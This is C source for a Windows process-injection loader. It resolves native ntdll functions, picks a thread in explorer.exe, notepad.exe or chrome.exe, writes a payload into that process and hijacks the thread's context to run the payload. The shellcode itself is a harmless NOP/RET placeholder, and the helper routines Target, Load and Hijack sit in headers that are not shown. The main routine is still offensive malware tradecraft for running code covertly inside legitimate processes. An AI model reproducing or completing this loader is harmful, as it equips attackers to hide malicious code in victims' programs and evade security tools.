#include <stdio.h>
#include <windows.h>

#include "main.h"
#include "nt.h"

#define success(...) printf("[+] " __VA_ARGS__); 
#define err(...)     printf("[-] Failed To Inject ShellCode | " __VA_ARGS__);

#define SUCCESS 1

// Obviously this is not real shellcode so thread might crash if this "payload" is injected.

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0xC3
};

const wchar_t* TargetProcesses[] = {
    L"explorer.exe",
    L"notepad.exe",
    L"chrome.exe",
};

    NtAllocateVirtualMemory NtVirtAlloc     = NULL;
    NtOpenProcess           NtOpenProc      = NULL;
    NtWriteVirtualMemory    NtWriteVirtMem  = NULL;
    NtCreateThreadEx        NtCreateThread  = NULL;

    NtOpenThread            NtOpenT         = NULL;
    NtSuspendThread         NtSuspend       = NULL;
    NtGetContextThread      NtGetContext    = NULL;
    NtSetContextThread      NtSetContext    = NULL;
    NtResumeThread          NtResume        = NULL;

int main() {
    
        BYTE*  Payload      = shellcode;
        SIZE_T PayloadSize  = sizeof(shellcode);
        DWORD  Thread       = 0;
        LPVOID RemoteAddr   = NULL;
        

    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!nt) {
        err("Failed To Load NT DLL");
    }

    NtOpenProc = (NtOpenProcess)GetProcAddress(nt, "NtOpenProcess");
    NtVirtAlloc = (NtAllocateVirtualMemory)GetProcAddress(nt, "NtAllocateVirtualMemory");
    NtWriteVirtMem = (NtWriteVirtualMemory)GetProcAddress(nt, "NtWriteVirtualMemory");
    NtCreateThread = (NtCreateThreadEx)GetProcAddress(nt, "NtCreateThreadEx");

    NtOpenT = (NtOpenThread)GetProcAddress(nt, "NtOpenThread");
    NtSuspend = (NtSuspendThread)GetProcAddress(nt, "NtSuspendThread");
    NtGetContext = (NtGetContextThread)GetProcAddress(nt, "NtGetContextThread");
    NtSetContext = (NtSetContextThread)GetProcAddress(nt, "NtSetContextThread");
    NtResume = (NtResumeThread)GetProcAddress(nt, "NtResumeThread");

    if (!NtOpenProc || !NtVirtAlloc || !NtWriteVirtMem || !NtCreateThread  || !NtOpenT|| !SuspendThread || !NtGetContext || !NtSetContext || !NtResume) {
        err("Failed To Load NT DLL Functions")
        exit(EXIT_FAILURE);
    }

    /////////////////////////////////////////////////

    Thread = Target(TargetProcesses, sizeof(TargetProcesses) / sizeof(TargetProcesses[0]));
    if (Thread == 0) {
        err("Failed To Find and Extract The Thread ID From a Process")
        exit(EXIT_FAILURE);
    }

    /////////////////////////////////////////////////

    RemoteAddr = Load(0, Payload, PayloadSize, nt);
    if (RemoteAddr == NULL) {
        err("Thread ID -> %d", Thread)
        exit(EXIT_FAILURE);
    }

    /////////////////////////////////////////////////

    if (!Hijack(RemoteAddr, Thread)) {
        err("Failed To Hijack and Manipulate Thread | Thread ID -> %d", Thread);
        exit(EXIT_FAILURE);
    }

    /////////////////////////////////////////////////

    success("Injected Shell Code Into Process | Thread ID -> %d", Thread)
    exit(EXIT_SUCCESS);
}
